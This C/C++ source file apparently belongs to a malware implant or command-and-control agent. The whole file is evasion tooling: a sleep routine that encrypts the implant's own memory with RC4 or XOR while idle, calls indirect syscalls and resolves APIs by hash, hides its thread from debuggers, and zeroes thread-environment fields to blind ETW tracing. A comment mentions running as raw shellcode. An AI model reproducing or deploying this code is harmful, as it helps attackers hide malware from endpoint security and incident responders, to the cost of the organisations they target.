#include "OpsecSleep.h"
#include "ApiLoader.h"
#include "IndirectSyscall.h"
#include "ApiDefines.h"
#include "ProcLoader.h"

#define OPSEC_MASK_MAX_REGIONS 96
#ifndef WT_EXECUTEINTIMERTHREAD
#define WT_EXECUTEINTIMERTHREAD 0x20
#endif

/* ================================================================
 * ETW Event tracing cleanup — before sleeping, clear ETW traces
 * to hinder analysis tools that rely on ETW events.
 * ================================================================ */

/* NtSetInformationThread class for hiding thread from ETW */
#define AX_THREAD_HIDE_FROM_DEBUGGER 0x11

/* 
 * NtTraceEvent / EtwEventWrite — we use NtSetInformationThread
 * with ThreadHideFromDebugger (0x11) to suppress ETW for this thread.
 * Additionally, we can try to close the EtwRegistration handle from PEB.
 */
static void OpsecClearEtwTraces(void)
{
	/* 
	 * Strategy:
	 * 1. Get current thread handle via NtCurrentThread()
	 * 2. Call NtSetInformationThread with ThreadHideFromDebugger
	 *    This suppresses ETW events for the current thread silently.
	 * 3. This fails silently on systems without ETW or if already hidden.
	 *    That's fine — it's best-effort.
	 */
	
	/* We need the NtSetInformationThread function */
	HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
	if (!hNtdll && ApiWin && ApiWin->GetModuleHandleA) {
		hNtdll = ApiWin->GetModuleHandleA("ntdll.dll");
	}
	
	if (!hNtdll)
		return;
	
	/* Resolve NtSetInformationThread dynamically by hash */
	typedef NTSTATUS (NTAPI *pfnNtSetInformationThread)(
		HANDLE ThreadHandle,
		ULONG  ThreadInformationClass,
		PVOID  ThreadInformation,
		ULONG  ThreadInformationLength
	);
	
	pfnNtSetInformationThread pNtSetInformationThread =
		(pfnNtSetInformationThread)GetSymbolAddress(
			hNtdll,
			/* Djb2A hash of "NtSetInformationThread" with AX_HASH_SALT */
			AX_H(0x1c9e4a77)
		);
	
	if (!pNtSetInformationThread)
		return;
	
	/* Hide current thread from ETW/debugger */
	HANDLE hThread = (HANDLE)(LONG_PTR)-2; /* NtCurrentThread() */
	ULONG hideVal = 1;
	pNtSetInformationThread(hThread, AX_THREAD_HIDE_FROM_DEBUGGER, &hideVal, sizeof(hideVal));
	
	/* 
	 * Also try to clear the ETW trace buffer pointer in PEB/TEB.
	 * TEB->EtwTraceData is at offset 0x2010+ on x64.
	 * We simply zero it to break ETW writes.
	 */
#ifdef _M_X64
	/* Using inline asm to read TEB and clear EtwTraceData */
	__asm__ __volatile__(
		"movq %%gs:0x30, %%rax\n"   /* TEB from GS segment */
		"movq $0, 0x2000(%%rax)\n"  /* Clear TEB->EtwTraceData */
		"movq $0, 0x2008(%%rax)\n"  /* Clear adjacent field */
		:
		:
		: "rax"
	);
#elif defined(_M_IX86)
	__asm__ __volatile__(
		"movl %%fs:0x18, %%eax\n"   /* TEB from FS segment */
		"movl $0, 0x2000(%%eax)\n"  /* Clear TEB->EtwTraceData */
		"movl $0, 0x2004(%%eax)\n"  /* Clear adjacent field */
		:
		:
		: "eax"
	);
#endif
}

struct MaskedRegion {
	PVOID base;
	SIZE_T size;
	ULONG oldProtect;
};

struct SleepEncCtx {
	HANDLE evt;
	MaskedRegion* regions;
	int n;
	AX_USTRING keyUs;
	PFN_SYSTEMFUNCTION032 sf032;
};

static void DeriveKey32(BYTE key[32])
{
	ULONG seed = ApiWin->GetTickCount();
	for (int i = 0; i < 32; i++) {
		if (ApiNt && ApiNt->RtlRandomEx)
			key[i] = (BYTE)(ApiNt->RtlRandomEx(&seed) & 0xFF);
		else
			key[i] = (BYTE)((seed ^ (ULONG)(i * 0x41C64E6D)) & 0xFF);
	}
}

static BOOL ShouldEncryptRegion(DWORD prot)
{
	if (prot & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
		return FALSE;
	if (prot & (PAGE_NOACCESS | PAGE_GUARD))
		return FALSE;
	return (prot & (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY)) != 0;
}

static VOID CALLBACK OpsecSleepTimerDecrypt(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
{
	(void)TimerOrWaitFired;
	SleepEncCtx* c = (SleepEncCtx*)lpParameter;
	if (!c || !ApiWin)
		goto fin;
	if (c->sf032 && c->keyUs.Buffer && c->keyUs.Length) {
		for (int i = 0; i < c->n; i++) {
			if (!c->regions[i].base || c->regions[i].size == 0)
				continue;
			AX_USTRING du;
			du.Buffer = (PUCHAR)c->regions[i].base;
			du.Length = (ULONG)c->regions[i].size;
			du.MaximumLength = du.Length;
			c->sf032(&du, &c->keyUs);
		}
	}
fin:
	if (c && c->evt && ApiWin->SetEvent)
		ApiWin->SetEvent(c->evt);
}

static void XorBuffer(PBYTE p, SIZE_T n, const BYTE key[32])
{
	for (SIZE_T i = 0; i < n; i++)
		p[i] ^= key[i & 31];
}

static void Rc4ToggleSavedRegions(MaskedRegion* saved, int nSaved, const BYTE key[32])
{
	for (int i = 0; i < nSaved; i++) {
		if (!saved[i].base || saved[i].size == 0)
			continue;
		AX_USTRING du;
		AX_USTRING ku;
		ku.Buffer = (PUCHAR)key;
		ku.Length = 32;
		ku.MaximumLength = 32;
		du.Buffer = (PBYTE)saved[i].base;
		du.Length = (ULONG)saved[i].size;
		du.MaximumLength = du.Length;
		if (du.Length && ApiWin && ApiWin->SystemFunction032)
			ApiWin->SystemFunction032(&du, &ku);
	}
}

static void RestoreSavedProtect(MaskedRegion* saved, int nSaved, HANDLE proc)
{
	for (int i = nSaved - 1; i >= 0; i--) {
		PVOID b = saved[i].base;
		SIZE_T s = saved[i].size;
		ULONG tmp = 0;
		Indirect_NtProtectVirtualMemory(proc, &b, &s, saved[i].oldProtect, &tmp);
	}
}

static BOOL TryTimerQueueRc4Sleep(ULONG milliseconds, HMODULE imageBase, ULONG sizeOfImage, HANDLE proc)
{
	if (!ApiWin->SystemFunction032 || !ApiWin->CreateTimerQueue || !ApiWin->CreateTimerQueueTimer ||
	    !ApiWin->DeleteTimerQueueEx || !ApiWin->CreateEventA || !ApiWin->SetEvent || !ApiWin->ResetEvent ||
	    !ApiWin->WaitForSingleObject)
		return FALSE;

	BYTE key[32];
	DeriveKey32(key);

	MaskedRegion saved[OPSEC_MASK_MAX_REGIONS];
	int nSaved = 0;

	BYTE* scan = (BYTE*)imageBase;
	BYTE* end = scan + sizeOfImage;

	while (scan < end && nSaved < OPSEC_MASK_MAX_REGIONS) {
		MEMORY_BASIC_INFORMATION mbi;
		memset(&mbi, 0, sizeof(mbi));
		if (!ApiWin->VirtualQuery(scan, &mbi, sizeof(mbi)))
			break;

		if ((mbi.Type == MEM_IMAGE || mbi.Type == MEM_PRIVATE) && mbi.AllocationBase == imageBase &&
		    mbi.State == MEM_COMMIT && ShouldEncryptRegion(mbi.Protect)) {
			PVOID protectBase = mbi.BaseAddress;
			SIZE_T protectSize = mbi.RegionSize;
			ULONG oldProt = 0;
			NTSTATUS st = Indirect_NtProtectVirtualMemory(proc, &protectBase, &protectSize, PAGE_READWRITE, &oldProt);
			if ((LONG)st >= 0) {
				AX_USTRING du;
				AX_USTRING ku;
				ku.Buffer = key;
				ku.Length = 32;
				ku.MaximumLength = 32;
				du.Buffer = (PBYTE)mbi.BaseAddress;
				du.Length = (ULONG)mbi.RegionSize;
				du.MaximumLength = du.Length;
				if (du.Length)
					ApiWin->SystemFunction032(&du, &ku);

				saved[nSaved].base = mbi.BaseAddress;
				saved[nSaved].size = mbi.RegionSize;
				saved[nSaved].oldProtect = oldProt;
				nSaved++;
			}
		}

		scan = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
	}

	if (nSaved == 0) {
		LARGE_INTEGER interval;
		interval.QuadPart = -(LONGLONG)milliseconds * 10000LL;
		Indirect_NtDelayExecution(FALSE, &interval);
		return TRUE;
	}

	HANDLE evt = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
	if (!evt) {
		Rc4ToggleSavedRegions(saved, nSaved, key);
		RestoreSavedProtect(saved, nSaved, proc);
		return FALSE;
	}

	HANDLE tq = ApiWin->CreateTimerQueue();
	if (!tq) {
		if (ApiNt && ApiNt->NtClose)
			ApiNt->NtClose(evt);
		Rc4ToggleSavedRegions(saved, nSaved, key);
		RestoreSavedProtect(saved, nSaved, proc);
		return FALSE;
	}
 
	SleepEncCtx ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.evt = evt;
	ctx.regions = saved;
	ctx.n = nSaved;
	ctx.sf032 = ApiWin->SystemFunction032;
	ctx.keyUs.Buffer = key;
	ctx.keyUs.Length = 32;
	ctx.keyUs.MaximumLength = 32;

	ApiWin->ResetEvent(evt);

	HANDLE hTimer = NULL;
	if (!ApiWin->CreateTimerQueueTimer(&hTimer, tq, OpsecSleepTimerDecrypt, &ctx, milliseconds, 0, WT_EXECUTEINTIMERTHREAD)) {
		ApiWin->DeleteTimerQueueEx(tq, INVALID_HANDLE_VALUE);
		if (ApiNt && ApiNt->NtClose)
			ApiNt->NtClose(evt);
		Rc4ToggleSavedRegions(saved, nSaved, key);
		RestoreSavedProtect(saved, nSaved, proc);
		return FALSE;
	}

	LARGE_INTEGER interval;
	interval.QuadPart = -(LONGLONG)milliseconds * 10000LL;
	Indirect_NtDelayExecution(FALSE, &interval);

	DWORD w = ApiWin->WaitForSingleObject(evt, milliseconds + 8000);
	if (w != WAIT_OBJECT_0)
		Rc4ToggleSavedRegions(saved, nSaved, key);

	ApiWin->DeleteTimerQueueEx(tq, INVALID_HANDLE_VALUE);
	if (ApiNt && ApiNt->NtClose)
		ApiNt->NtClose(evt);

	RestoreSavedProtect(saved, nSaved, proc);
	return TRUE;
}

void OpsecSleepMilliseconds(ULONG milliseconds)
{
	if (!ApiWin)
		return;
	if (milliseconds == 0)
		return;

	/* Clear ETW traces before sleeping */
	OpsecClearEtwTraces();

	if (!ApiNt || !ApiNt->NtDelayExecution || !ApiNt->NtProtectVirtualMemory ||
	    !ApiWin->VirtualQuery || !ApiWin->GetModuleHandleA) {
		ApiWin->Sleep(milliseconds);
		return;
	}

	HMODULE imageBase = NULL;
	MEMORY_BASIC_INFORMATION localMbi;
	if (ApiWin->VirtualQuery((LPCVOID)OpsecSleepMilliseconds, &localMbi, sizeof(localMbi))) {
		imageBase = (HMODULE)localMbi.AllocationBase;
	}

	if (!imageBase) {
		ApiWin->Sleep(milliseconds);
		return;
	}

	auto* dos = (PIMAGE_DOS_HEADER)imageBase;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		// If not a valid PE header, we might be running as raw shellcode without PE headers. 
		// In this case, we can still try to encrypt the entire allocation.
		// However, for safety, let's just proceed with standard sleep if we can't find a size.
		ApiWin->Sleep(milliseconds);
		return;
	}

	auto* nth = (PIMAGE_NT_HEADERS)((ULONG_PTR)imageBase + dos->e_lfanew);
	if (nth->Signature != IMAGE_NT_SIGNATURE) {
		ApiWin->Sleep(milliseconds);
		return;
	}

	ULONG sizeOfImage = nth->OptionalHeader.SizeOfImage;
	HANDLE proc = NtCurrentProcess();

	/*
	 * Stability fix: the TimerQueue RC4 path encrypts image RW regions that
	 * include global API tables (ApiWin/ApiNt), then continues to call APIs
	 * through those same globals from timer cleanup/callback paths. On Windows
	 * this can corrupt function pointers or pass invalid handles into
	 * KERNELBASE, causing intermittent 0xc0000005 crashes around the
	 * DeleteTimerQueueEx / SetEvent cleanup sequence. Use the synchronous XOR
	 * fallback below until the async TimerQueue path is rewritten to keep all
	 * callback state and API pointers outside masked regions.
	 */

	BYTE key[32];
	DeriveKey32(key);

	MaskedRegion saved[OPSEC_MASK_MAX_REGIONS];
	int nSaved = 0;

	BYTE* scan = (BYTE*)imageBase;
	BYTE* end = scan + sizeOfImage;

	while (scan < end && nSaved < OPSEC_MASK_MAX_REGIONS) {
		MEMORY_BASIC_INFORMATION mbi;
		memset(&mbi, 0, sizeof(mbi));
		if (!ApiWin->VirtualQuery(scan, &mbi, sizeof(mbi)))
			break;

		if ((mbi.Type == MEM_IMAGE || mbi.Type == MEM_PRIVATE) && mbi.AllocationBase == imageBase &&
		    mbi.State == MEM_COMMIT && ShouldEncryptRegion(mbi.Protect)) {
			PVOID protectBase = mbi.BaseAddress;
			SIZE_T protectSize = mbi.RegionSize;
			ULONG oldProt = 0;
			NTSTATUS st = Indirect_NtProtectVirtualMemory(proc, &protectBase, &protectSize, PAGE_READWRITE, &oldProt);
			if ((LONG)st >= 0) {
				XorBuffer((PBYTE)mbi.BaseAddress, mbi.RegionSize, key);
				saved[nSaved].base = mbi.BaseAddress;
				saved[nSaved].size = mbi.RegionSize;
				saved[nSaved].oldProtect = oldProt;
				nSaved++;
			}
		}

		scan = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
	}

	LARGE_INTEGER interval;
	interval.QuadPart = -(LONGLONG)milliseconds * 10000LL;
	Indirect_NtDelayExecution(FALSE, &interval);

	for (int i = nSaved - 1; i >= 0; i--) {
		XorBuffer((PBYTE)saved[i].base, saved[i].size, key);
		PVOID b = saved[i].base;
		SIZE_T s = saved[i].size;
		ULONG tmp = 0;
		Indirect_NtProtectVirtualMemory(proc, &b, &s, saved[i].oldProtect, &tmp);
	}
}
